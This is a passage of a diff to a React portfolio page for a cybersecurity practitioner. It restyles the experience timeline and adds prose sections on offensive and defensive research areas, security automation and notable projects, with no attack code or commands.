+          category: "defensive"
         }
       ]
     }
   ];
 
-  // Function to filter experiences
-  const filteredExperiences = activeFilter === 'all' 
-    ? experiences 
-    : experiences.filter(exp => exp.type === activeFilter);
-
-  // Function to copy code to clipboard
-  const copyToClipboard = (code) => {
-    navigator.clipboard.writeText(code)
-      .then(() => {
-        // Could add a toast notification here
-        console.log('Code copied to clipboard');
-      })
-      .catch(err => {
-        console.error('Failed to copy: ', err);
-      });
-  };
-
   return (
-    <div className="min-h-screen">
-      {/* Hero Section */}
-      <section className="py-20 px-4 relative overflow-hidden">
-        <div className="absolute inset-0">
-          <div className="absolute inset-0 bg-gradient-to-b from-black via-transparent to-black z-0"></div>
-          <div className="absolute top-1/4 -right-20 w-72 h-72 bg-pink-500/10 rounded-full blur-3xl animate-pulse"></div>
-          <div className="absolute top-3/4 -left-20 w-96 h-96 bg-blue-500/10 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '1.5s' }}></div>
-        </div>
-        
-        <div className="container mx-auto relative z-10">
-          <div className="max-w-4xl mx-auto text-center">
-            <h1 className="text-5xl md:text-6xl font-bold mb-8 bg-gradient-to-r from-blue-400 to-pink-500 text-transparent bg-clip-text">
-              Professional Experience
-            </h1>
-            <p className="text-xl text-gray-300 mb-8 max-w-3xl mx-auto">
-              A journey through cybersecurity research, vulnerability discovery, and advanced defensive strategies
-            </p>
-            
-            <div className="flex flex-wrap justify-center gap-3 mb-6">
-              <button 
-                onClick={() => setActiveFilter('all')}
-                className={`px-5 py-2 rounded-full transition-all ${
-                  activeFilter === 'all' 
-                    ? 'bg-gradient-to-r from-pink-500 to-purple-500 text-white shadow-lg shadow-pink-500/20' 
-                    : 'bg-white/5 text-gray-300 hover:bg-white/10 border border-white/10'
-                }`}
-              >
-                All Experience
-              </button>
-              <button 
-                onClick={() => setActiveFilter('professional')}
-                className={`px-5 py-2 rounded-full transition-all ${
-                  activeFilter === 'professional' 
-                    ? 'bg-gradient-to-r from-pink-500 to-purple-500 text-white shadow-lg shadow-pink-500/20' 
-                    : 'bg-white/5 text-gray-300 hover:bg-white/10 border border-white/10'
-                }`}
-              >
-                Professional
-              </button>
-              <button 
-                onClick={() => setActiveFilter('academic')}
-                className={`px-5 py-2 rounded-full transition-all ${
-                  activeFilter === 'academic' 
-                    ? 'bg-gradient-to-r from-pink-500 to-purple-500 text-white shadow-lg shadow-pink-500/20' 
-                    : 'bg-white/5 text-gray-300 hover:bg-white/10 border border-white/10'
-                }`}
-              >
-                Academic
-              </button>
-            </div>
-          </div>
-        </div>
+    <div className="min-h-screen max-w-6xl mx-auto px-4 py-12">
+      {/* Header Section */}
+      <section className="mb-16 text-center">
+        <h1 className="text-4xl md:text-5xl font-bold mb-6 bg-gradient-to-r from-blue-400 to-pink-500 text-transparent bg-clip-text">
+          Professional Experience
+        </h1>
+        <p className="text-xl text-gray-400 max-w-3xl mx-auto">
+          A journey through cybersecurity challenges, from defensive hardening to offensive security research and malware analysis.
+        </p>
       </section>
 
       {/* Experience Timeline */}
-      <section className="py-16 px-4">
-        <div className="container mx-auto">
-          <div className="max-w-6xl mx-auto">
-            {/* Timeline */}
-            <div className="relative">
-              {/* Vertical Line */}
-              <div className="absolute left-8 md:left-1/2 top-0 bottom-0 w-1 bg-gradient-to-b from-pink-500 to-purple-500 transform md:translate-x-[-50%] shadow-glow"></div>
-              
-              {/* Experience Items */}
-              <div className="space-y-24">
-                {filteredExperiences.map((experience, idx) => (
-                  <div 
-                    id={`exp-${experience.id}`}
-                    key={experience.id}
-                    ref={el => registerSection(`exp-${experience.id}`, el)}
-                    className={`relative flex flex-col md:flex-row gap-8 ${
-                      idx % 2 === 0 || !experience.achievements ? 'md:flex-row' : 'md:flex-row-reverse'
-                    }`}
-                  >
-                    {/* Timeline connector and logo */}
-                    <div className="absolute left-8 md:left-1/2 top-0 w-16 h-16 rounded-full bg-black border-4 border-gray-800 transform translate-x-[-50%] z-10 flex items-center justify-center">
-                      <div className={`w-10 h-10 rounded-full flex items-center justify-center text-white text-xl font-bold`} style={{ backgroundColor: experience.logoColor }}>
-                        {experience.company.charAt(0)}
-                      </div>
+      <section 
+        id="experience-timeline" 
+        ref={el => registerSection('experience-timeline', el)}
+        className="mb-20"
+      >
+        <div className={`transition-all duration-700 ${isVisible['experience-timeline'] ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-20'}`}>
+          <div className="relative">
+            {/* Timeline line */}
+            <div className="absolute left-7 md:left-1/2 top-0 h-full w-1 bg-gradient-to-b from-pink-500 to-purple-500 transform md:-translate-x-1/2"></div>
+            
+            {/* Experience items */}
+            <div className="space-y-24">
+              {professionalExperience.map((experience, idx) => (
+                <div key={idx}>
+                  {/* Company and Period Timeline Node */}
+                  <div className="relative flex items-center mb-8">
+                    <div className="absolute left-7 md:left-1/2 w-5 h-5 bg-gradient-to-r from-pink-500 to-purple-500 rounded-full transform -translate-x-1/2 z-10"></div>
+                    
+                    <div className="md:w-1/2 md:text-right md:pr-8 pl-16 md:pl-0">
+                      <h2 className="text-2xl font-bold">{experience.company}</h2>
+                      <p className="text-pink-500 font-medium">{experience.position}</p>
                     </div>
                     
-                    {/* Experience Card */}
-                    <div className={`md:w-[48%] ${idx % 2 === 0 ? 'md:ml-auto' : ''} pl-20 md:pl-0`}>
-                      <div 
-                        className={`glass p-8 rounded-xl border border-white/10 backdrop-blur-md transition-all duration-700 ${
-                          isVisible[`exp-${experience.id}`] ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-20'
-                        }`}
-                      >
-                        <div className="mb-6">
-                          <h3 className="text-2xl font-bold mb-1">{experience.role}</h3>
-                          <div className="flex flex-wrap items-center gap-2 mb-2">
-                            <span className="text-xl text-pink-400">{experience.company}</span>
-                            <span className="text-gray-500">•</span>
-                            <span className="text-gray-400">{experience.location}</span>
-                          </div>
-                          <span className="text-gray-500 text-sm">{experience.period}</span>
-                        </div>
-                        
-                        <p className="text-gray-300 mb-6">{experience.description}</p>
-                        
-                        {experience.responsibilities && (
-                          <div className="mb-6">
-                            <h4 className="text-lg font-semibold mb-3">Key Responsibilities</h4>
-                            <ul className="space-y-2">
-                              {experience.responsibilities.map((resp, idx) => (
-                                <li key={idx} className="flex items-start gap-2">
-                                  <span className="text-pink-500 mt-1">•</span>
-                                  <span>{resp}</span>
-                                </li>
-                              ))}
-                            </ul>
-                          </div>
-                        )}
-                      </div>
+                    <div className="hidden md:block md:w-1/2 md:pl-8">
+                      <p className="text-gray-400">{experience.period}</p>
+                      <p className="text-gray-500">{experience.location}</p>
                     </div>
                     
-                    {/* Spacer or empty div for timeline layout */}
-                    <div className={`hidden md:block md:w-[48%] ${idx % 2 === 0 ? '' : 'md:ml-auto'}`}></div>
+                    <div className="md:hidden absolute right-0 top-0">
+                      <p className="text-gray-400 text-sm">{experience.period}</p>
+                      <p className="text-gray-500 text-sm">{experience.location}</p>
+                    </div>
                   </div>
-                ))}
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
-
-      {/* Technical Achievements Section */}
-      <section className="py-20 px-4 bg-gradient-to-b from-black/80 to-black relative overflow-hidden">
-        <div className="absolute top-0 left-0 w-full h-32 bg-gradient-to-b from-black to-transparent"></div>
-        <div className="container mx-auto relative z-10">
-          <h2 className="text-4xl font-bold mb-16 text-center bg-gradient-to-r from-blue-400 to-pink-500 text-transparent bg-clip-text">
-            Technical Achievements
-          </h2>
-          
-          <div className="max-w-6xl mx-auto">
-            {filteredExperiences.map((experience) => (
-              experience.achievements && (
-                <div 
-                  key={`${experience.id}-achieve`}
-                  id={`achieve-${experience.id}`}
-                  ref={el => registerSection(`achieve-${experience.id}`, el)}
-                  className={`mb-16 transition-all duration-700 ${
-                    isVisible[`achieve-${experience.id}`] ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-20'
-                  }`}
-                >
-                  <h3 className="text-2xl font-bold mb-6 flex items-center gap-3">
-                    <div className={`w-8 h-8 rounded-full flex items-center justify-center text-white text-sm font-bold`} style={{ backgroundColor: experience.logoColor }}>
-                      {experience.company.charAt(0)}
-                    </div>
-                    <span>{experience.company} - Key Projects</span>
-                  </h3>
                   
-                  <div className="grid md:grid-cols-2 gap-6 mb-10">
-                    {experience.achievements.map((achievement, idx) => (
+                  {/* Overview */}
+                  <div className="ml-16 md:ml-0 md:px-16">
+                    <div className="glass rounded-xl p-6 mb-8 border border-white/10">
+                      <p className="text-gray-300">{experience.description}</p>
+                    </div>
+                  </div>
+                  
+                  {/* Highlights Grid */}
+                  <div className="ml-16 md:ml-0 md:px-16 grid md:grid-cols-2 gap-6">
+                    {experience.highlights.map((highlight, hIdx) => (
                       <div 
-                        key={idx}
-                        className="glass p-6 rounded-xl border border-white/10 transition-all duration-300 hover:border-white/30 hover:shadow-lg"
-                        style={{ 
-                          transitionDelay: `${idx * 0.1}s`,
-                          opacity: isVisible[`achieve-${experience.id}`] ? 1 : 0,
-                          transform: isVisible[`achieve-${experience.id}`] ? 'translateY(0)' : 'translateY(20px)',
+                        key={hIdx} 
+                        className={`glass rounded-xl p-6 border transition-all duration-300 hover:shadow-lg ${
+                          highlight.category === 'offensive' 
+                            ? 'border-red-500/20 hover:border-red-500/30' 
+                            : highlight.category === 'defensive'
+                              ? 'border-blue-500/20 hover:border-blue-500/30'
+                              : 'border-purple-500/20 hover:border-purple-500/30'
+                        }`}
+                        style={{
+                          animationDelay: `${hIdx * 0.1}s`,
+                          opacity: isVisible['experience-timeline'] ? 1 : 0,
+                          transform: isVisible['experience-timeline'] ? 'translateY(0)' : 'translateY(20px)',
                           transition: `opacity 0.5s ease, transform 0.5s ease`,
-                          transitionDelay: `${idx * 0.1 + 0.3}s`
+                          transitionDelay: `${(idx * 0.2) + (hIdx * 0.1)}s`
                         }}
                       >
-                        <h4 className="text-xl font-bold mb-3 text-pink-400">{achievement.title}</h4>
-                        <p className="text-gray-300 mb-4">{achievement.description}</p>
+                        <div className="flex justify-between items-start mb-4">
+                          <h3 className="text-xl font-bold">{highlight.title}</h3>
+                          <span className={`text-xs px-2 py-1 rounded-full ${
+                            highlight.category === 'offensive' 
+                              ? 'bg-red-500/10 text-red-400' 
+                              : highlight.category === 'defensive'
+                                ? 'bg-blue-500/10 text-blue-400'
+                                : 'bg-purple-500/10 text-purple-400'
+                          }`}>
+                            {highlight.category === 'offensive' 
+                              ? 'Red Team' 
+                              : highlight.category === 'defensive'
+                                ? 'Blue Team'
+                                : 'Red & Blue Team'}
+                          </span>
+                        </div>
                         
-                        {achievement.tech && (
-                          <div className="flex flex-wrap gap-2">
-                            {achievement.tech.map(tech => (
-                              <span key={tech} className="px-3 py-1 bg-white/5 rounded-full text-sm border border-white/10">
-                                {tech}
-                              </span>
-                            ))}
-                          </div>
-                        )}
+                        <p className="text-gray-300 mb-4">{highlight.description}</p>
+                        
+                        <div className="flex flex-wrap gap-2">
+                          {highlight.technologies.map((tech) => (
+                            <span key={tech} className="px-2 py-1 bg-white/5 rounded-md text-xs text-gray-400">
+                              {tech}
+                            </span>
+                          ))}
+                        </div>
                       </div>
                     ))}
                   </div>
-                  
-                  {/* Code Highlights */}
-                  {experience.codeHighlights && (
-                    <div className="space-y-8">
-                      {experience.codeHighlights.map((highlight, idx) => (
-                        <div 
-                          key={idx}
-                          className="glass rounded-xl overflow-hidden border border-white/10 transition-all duration-300 hover:border-white/20"
-                          style={{ 
-                            transitionDelay: `${idx * 0.2}s`,
-                            opacity: isVisible[`achieve-${experience.id}`] ? 1 : 0,
-                            transform: isVisible[`achieve-${experience.id}`] ? 'translateY(0)' : 'translateY(20px)',
-                            transition: `opacity 0.6s ease, transform 0.6s ease`,
-                            transitionDelay: `${idx * 0.2 + 0.5}s`
-                          }}
-                        >
-                          <div className="bg-gray-900 px-4 py-3 flex justify-between items-center">
-                            <div className="flex items-center gap-3">
-                              <div className="flex gap-1.5">
-                                <div className="w-3 h-3 rounded-full bg-red-500"></div>
-                                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
-                                <div className="w-3 h-3 rounded-full bg-green-500"></div>
-                              </div>
-                              <h5 className="font-medium">{highlight.title}</h5>
-                            </div>
-                            <div className="flex gap-2">
-                              <span className="text-xs px-2 py-1 rounded bg-blue-500/20 text-blue-400">
-                                {highlight.language}
-                              </span>
-                              <button 
-                                onClick={() => copyToClipboard(highlight.code)}
-                                className="text-gray-400 hover:text-white transition-colors"
-                              >
-                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
-                                </svg>
-                              </button>
-                            </div>
-                          </div>
-                          <div className="p-4 overflow-x-auto bg-gray-950 text-gray-300 font-mono text-sm">
-                            <pre>{highlight.code}</pre>
-                          </div>
-                        </div>
-                      ))}
-                    </div>
-                  )}
                 </div>
-              )
-            ))}
+              ))}
+            </div>
           </div>
         </div>
       </section>
 
-      {/* Skills Summary */}
+      {/* Research Focus Areas */}
       <section 
-        id="skills-summary"
-        ref={el => registerSection('skills-summary', el)}
-        className="py-20 px-4 relative overflow-hidden"
+        id="research-areas" 
+        ref={el => registerSection('research-areas', el)} 
+        className="py-16 glass p-8 rounded-xl border border-white/10 mb-20"
       >
-        <div className="absolute -top-40 right-0 w-96 h-96 bg-pink-500/5 rounded-full blur-3xl"></div>
-        <div className="container mx-auto relative z-10">
-          <div className={`transition-all duration-700 ${isVisible['skills-summary'] ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-20'}`}>
-            <h2 className="text-4xl font-bold mb-12 text-center">Technical Expertise</h2>
+        <div className={`transition-all duration-700 ${isVisible['research-areas'] ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-20'}`}>
+          <h2 className="text-3xl font-bold mb-8 text-center">Research Focus Areas</h2>
+          
+          <div className="grid md:grid-cols-3 gap-6">
+            <div className="p-6 bg-gradient-to-br from-red-900/20 to-red-800/10 rounded-xl border border-red-500/20">
+              <h3 className="text-xl font-bold mb-4 text-red-400">Offensive Security</h3>
+              <ul className="space-y-3">
+                <li className="flex items-start">
+                  <span className="text-red-500 mr-2">•</span>
+                  <span>Exploit development and weaponization</span>
+                </li>
+                <li className="flex items-start">
+                  <span className="text-red-500 mr-2">•</span>
+                  <span>Binary reverse engineering</span>
+                </li>
+                <li className="flex items-start">
+                  <span className="text-red-500 mr-2">•</span>
+                  <span>Advanced persistence techniques</span>
+                </li>
+                <li className="flex items-start">
+                  <span className="text-red-500 mr-2">•</span>
+                  <span>Memory corruption vulnerabilities</span>
+                </li>
+              </ul>
+            </div>
+
+            <div className="p-6 bg-gradient-to-br from-blue-900/20 to-blue-800/10 rounded-xl border border-blue-500/20">
+              <h3 className="text-xl font-bold mb-4 text-blue-400">Defensive Security</h3>
+              <ul className="space-y-3">
+                <li className="flex items-start">
+                  <span className="text-blue-500 mr-2">•</span>
+                  <span>Security hardening & compliance</span>
+                </li>
+                <li className="flex items-start">
+                  <span className="text-blue-500 mr-2">•</span>
+                  <span>Anomaly detection systems</span>
+                </li>
+                <li className="flex items-start">
+                  <span className="text-blue-500 mr-2">•</span>
+                  <span>Secure architecture design</span>
+                </li>
+                <li className="flex items-start">
+                  <span className="text-blue-500 mr-2">•</span>
+                  <span>Threat modeling & risk assessment</span>
+                </li>
+              </ul>
+            </div>
+
+            <div className="p-6 bg-gradient-to-br from-purple-900/20 to-purple-800/10 rounded-xl border border-purple-500/20">
+              <h3 className="text-xl font-bold mb-4 text-purple-400">Malware Research</h3>
+              <ul className="space-y-3">
+                <li className="flex items-start">
+                  <span className="text-purple-500 mr-2">•</span>
+                  <span>Advanced evasion techniques</span>
+                </li>
+                <li className="flex items-start">
+                  <span className="text-purple-500 mr-2">•</span>
+                  <span>Memory forensics & behavior analysis</span>
+                </li>
+                <li className="flex items-start">
+                  <span className="text-purple-500 mr-2">•</span>
+                  <span>Sandbox detection countermeasures</span>
+                </li>
+                <li className="flex items-start">
+                  <span className="text-purple-500 mr-2">•</span>
+                  <span>Novel infection vectors</span>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* Security Automation */}
+      <section 
+        id="security-automation" 
+        ref={el => registerSection('security-automation', el)} 
+        className="mb-20"
+      >
+        <div className={`transition-all duration-700 ${isVisible['security-automation'] ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-20'}`}>
+          <h2 className="text-3xl font-bold mb-8 text-center bg-gradient-to-r from-blue-400 to-pink-500 text-transparent bg-clip-text">
+            Security Automation Expertise
+          </h2>
+          
+          <div className="glass p-8 rounded-xl border border-white/10 mb-8">
+            <p className="text-gray-300 mb-6">
+              Throughout my career, I've focused on developing security automation solutions that bridge the gap between offensive and defensive security. By automating routine tasks, security teams can focus on complex challenges while maintaining comprehensive coverage.
+            </p>
             
-            <div className="max-w-4xl mx-auto glass p-8 rounded-xl border border-white/10 backdrop-blur-lg">
-              {/* Skill Categories */}
-              <div className="grid md:grid-cols-3 gap-8">
-                <div>
-                  <h3 className="text-xl font-bold mb-4 text-pink-400">Security Engineering</h3>
-                  <ul className="space-y-2">
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Vulnerability Research</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Penetration Testing</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Exploit Development</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Network Security</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Reverse Engineering</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Secure Architecture</span>
-                    </li>
-                  </ul>
-                </div>
-                
-                <div>
-                  <h3 className="text-xl font-bold mb-4 text-pink-400">Programming</h3>
-                  <ul className="space-y-2">
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Python</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>C/C++</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>JavaScript/TypeScript</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Bash/Shell Scripting</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Rust</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Assembly (x86/ARM)</span>
-                    </li>
-                  </ul>
-                </div>
-                
-                <div>
-                  <h3 className="text-xl font-bold mb-4 text-pink-400">Tools & Platforms</h3>
-                  <ul className="space-y-2">
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Ghidra & IDA Pro</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Metasploit Framework</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Burp Suite Professional</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>Docker & Kubernetes</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>AWS & Azure</span>
-                    </li>
-                    <li className="flex items-center gap-2">
-                      <span className="text-pink-500">•</span>
-                      <span>TensorFlow & PyTorch</span>
-                    </li>
-                  </ul>
-                </div>
+            <div className="grid md:grid-cols-2 gap-8">
+              <div className="border border-red-500/20 p-6 rounded-xl bg-red-900/5">
+                <h3 className="text-xl font-bold mb-4 text-center text-red-400">Offensive Automation</h3>
+                <ul className="space-y-4">
+                  <li className="bg-white/5 p-4 rounded-lg">
+                    <h4 className="font-bold mb-2">Vulnerability Discovery Pipeline</h4>
+                    <p className="text-gray-400 text-sm">
+                      Created a continuous scanning system that automates discovery of vulnerabilities across enterprise assets. The system combines multiple scanning tools and correlates findings to reduce false positives.
+                    </p>
+                  </li>
+                  <li className="bg-white/5 p-4 rounded-lg">
+                    <h4 className="font-bold mb-2">Exploit Generation System</h4>
+                    <p className="text-gray-400 text-sm">
+                      Developed a framework that automates the creation of proof-of-concept exploits for discovered vulnerabilities, enabling faster validation and prioritization of security issues.
+                    </p>
+                  </li>
+                  <li className="bg-white/5 p-4 rounded-lg">
+                    <h4 className="font-bold mb-2">Fuzz Testing Orchestration</h4>
+                    <p className="text-gray-400 text-sm">
+                      Built an intelligent fuzzing platform that directs testing efforts to code paths most likely to contain vulnerabilities, resulting in 40% more unique crashes than traditional approaches.
+                    </p>
+                  </li>
+                </ul>
+              </div>
+              
+              <div className="border border-blue-500/20 p-6 rounded-xl bg-blue-900/5">
+                <h3 className="text-xl font-bold mb-4 text-center text-blue-400">Defensive Automation</h3>
+                <ul className="space-y-4">
+                  <li className="bg-white/5 p-4 rounded-lg">
+                    <h4 className="font-bold mb-2">Security Hardening Scripts</h4>
+                    <p className="text-gray-400 text-sm">
+                      Engineered automated hardening scripts that apply security best practices to systems at scale, ensuring consistent security posture across the enterprise.
+                    </p>
+                  </li>
+                  <li className="bg-white/5 p-4 rounded-lg">
+                    <h4 className="font-bold mb-2">Anomaly Detection System</h4>
+                    <p className="text-gray-400 text-sm">
+                      Created a machine learning-based system that identifies abnormal network behavior and user activity, providing early warning of potential security incidents.
+                    </p>
+                  </li>
+                  <li className="bg-white/5 p-4 rounded-lg">
+                    <h4 className="font-bold mb-2">Automated Incident Response</h4>
+                    <p className="text-gray-400 text-sm">
+                      Developed playbooks and automation tools that perform initial incident response actions, collecting forensic data and implementing containment measures to reduce impact.
+                    </p>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          
+          <div className="glass p-8 rounded-xl border border-purple-500/20 bg-purple-900/5">
+            <h3 className="text-xl font-bold mb-6 text-center text-purple-400">Full-Spectrum Security Tools</h3>
+            <p className="text-gray-300 mb-6 text-center">
+              By combining offensive and defensive perspectives, I've developed tools that provide comprehensive security coverage:
+            </p>
+            
+            <div className="grid md:grid-cols-3 gap-6">
+              <div className="bg-white/5 p-5 rounded-lg">
+                <h4 className="font-bold mb-3 text-center">Autonomous Vulnerability Management</h4>
+                <p className="text-gray-400 text-sm">
+                  End-to-end system that discovers, validates, prioritizes, and tracks vulnerabilities through remediation, reducing mean time to remediate by 45%.
+                </p>
+              </div>
+              
+              <div className="bg-white/5 p-5 rounded-lg">
+                <h4 className="font-bold mb-3 text-center">Continuous Security Validation</h4>
+                <p className="text-gray-400 text-sm">
+                  Platform that regularly tests security controls using real-world attack techniques, ensuring defenses remain effective against evolving threats.
+                </p>
+              </div>
+              
+              <div className="bg-white/5 p-5 rounded-lg">
+                <h4 className="font-bold mb-3 text-center">Malware Analysis Automation</h4>
+                <p className="text-gray-400 text-sm">
+                  System that automates the analysis of suspicious files, extracting IOCs and behavioral patterns to enhance detection capabilities.
+                </p>
               </div>
             </div>
           </div>
         </div>
       </section>
-
-      {/* Call to Action */}
+      
+      {/* Technical Challenges */}
       <section 
-        id="cta-section"
-        ref={el => registerSection('cta-section', el)}
-        className="py-20 px-4 bg-gradient-to-r from-pink-900/20 to-purple-900/20"
+        id="technical-challenges" 
+        ref={el => registerSection('technical-challenges', el)}
       >
-        <div className="container mx-auto">
-          <div className={`max-w-3xl mx-auto text-center transition-all duration-700 ${isVisible['cta-section'] ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-20'}`}>
-            <h2 className="text-3xl md:text-4xl font-bold mb-6">Interested in Collaboration?</h2>
-            <p className="text-xl text-gray-300 mb-8">
-              I'm always looking for interesting cybersecurity challenges and collaborative opportunities.
-            </p>
-            <div className="flex justify-center gap-6">
-              <Link 
-                to="/projects" 
-                className="px-6 py-3 bg-gradient-to-r from-pink-600 to-purple-600 rounded-full hover:scale-105 transition-all"
-              >
-                View Projects
-              </Link>
-              <Link 
-                to="/contact" 
-                className="px-6 py-3 bg-transparent border border-white/30 rounded-full hover:bg-white/10 hover:border-white/50 transition-all"
-              >
-                Get In Touch
-              </Link>
+        <div className={`transition-all duration-700 ${isVisible['technical-challenges'] ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-20'}`}>
+          <h2 className="text-3xl font-bold mb-8 text-center">Notable Technical Challenges</h2>
+          
+          <div className="space-y-6">
+            <div className="glass p-6 rounded-xl border border-white/10 hover:border-pink-500/20 transition-all duration-300">
+              <h3 className="text-xl font-bold mb-4">Hardware-Backed Security for IoT Devices</h3>
+              <p className="text-gray-300 mb-4">
+                Faced with securing resource-constrained IoT devices, I developed a novel approach using hardware security modules and lightweight cryptography. This solution provided strong security guarantees while maintaining acceptable performance on limited hardware.
+              </p>
+              <div className="flex flex-wrap gap-2 mb-4">
+                <span className="px-3 py-1 bg-white/5 rounded-full text-sm">Embedded Security</span>
+                <span className="px-3 py-1 bg-white/5 rounded-full text-sm">Hardware Security Modules</span>
+                <span className="px-3 py-1 bg-white/5 rounded-full text-sm">Cryptography</span>
+              </div>
+              <div className="flex items-center text-pink-500 text-sm">
+                <span className="mr-2">Key Achievement:</span>
+                <span className="text-white">Reduced firmware attack surface by 60% while maintaining functionality</span>
+              </div>
+            </div>
+            
+            <div className="glass p-6 rounded-xl border border-white/10 hover:border-pink-500/20 transition-all duration-300">
+              <h3 className="text-xl font-bold mb-4">Advanced Obfuscated Malware Analysis</h3>
+              <p className="text-gray-300 mb-4">
+                Analyzed a sophisticated malware variant that used multiple layers of packing, encryption, and anti-analysis techniques. By developing custom tools and leveraging advanced debugging methods, I was able to fully understand its operation and develop effective countermeasures.
+              </p>
+              <div className="flex flex-wrap gap-2 mb-4">
+                <span className="px-3 py-1 bg-white/5 rounded-full text-sm">Reverse Engineering</span>
+                <span className="px-3 py-1 bg-white/5 rounded-full text-sm">Dynamic Analysis</span>
+                <span className="px-3 py-1 bg-white/5 rounded-full text-sm">Anti-Anti-Analysis</span>
+              </div>
+              <div className="flex items-center text-pink-500 text-sm">
+                <span className="mr-2">Key Achievement:</span>
+                <span className="text-white">Developed detection signatures that identified previously undetected variants</span>
+              </div>
+            </div>
+            
+            <div className="glass p-6 rounded-xl border border-white/10 hover:border-pink-500/20 transition-all duration-300">
+              <h3 className="text-xl font-bold mb-4">Zero-Trust Network Implementation</h3>
+              <p className="text-gray-300 mb-4">
+                Led the design and implementation of a zero-trust architecture for a complex enterprise environment. The project involved integrating network segmentation, identity verification, and comprehensive monitoring while maintaining operational efficiency.
+              </p>
+              <div className="flex flex-wrap gap-2 mb-4">
+                <span className="px-3 py-1 bg-white/5 rounded-full text-sm">Zero-Trust</span>
+                <span className="px-3 py-1 bg-white/5 rounded-full text-sm">Network Architecture</span>
+                <span className="px-3 py-1 bg-white/5 rounded-full text-sm">Identity Management</span>
+              </div>
+              <div className="flex items-center text-pink-500 text-sm">
+                <span className="mr-2">Key Achievement:</span>
+                <span className="text-white">Reduced security incidents by 70% while improving system performance</span>
+              </div>
             </div>
           </div>
         </div>
       </section>
-
-      {/* Add custom style block for shadow-glow */}
-      <style jsx>{`
-        .shadow-glow {
-          box-shadow: 0 0 15px rgba(236, 72, 153, 0.5);
-        }
-      `}</style>
     </div>
   );
 }
